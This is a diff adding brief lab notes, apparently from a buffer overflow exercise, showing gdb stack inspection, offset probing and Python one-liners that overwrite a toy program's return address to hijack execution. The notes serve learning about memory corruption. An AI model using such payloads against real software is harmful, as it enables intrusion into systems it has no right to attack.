@@ -1,0 +1,22 @@
+Found ebp address, and the func return address using hook-stops
+define hook-stop
+x/x $ebp
+x/54x $esp
+info registers
+end
+
+this runs on various breakpoints to allow us to check the stack and find those return addresses
+
+dissassemble main to check the addresses
+
+run AAAABBBBCCCCDDDDEEEE etc allows us to exactly where the buffer overflows
+run AAAABBBBCZZZZDDDD allows us to validate
+
+dissassemble overflowtest to find the address 
+0x0804843b
+inverted due to little endian gives the following command
+run $(python -c 'print "A"*9 + "\x3b\x84\x04\x08"')
+
+Execution Hijacked is printed, program crashes.
+
+For overflow2.o in command line ./overflow2.o $(python -c 'print "A"*14 + "\x3b\x84\x04\x08"')
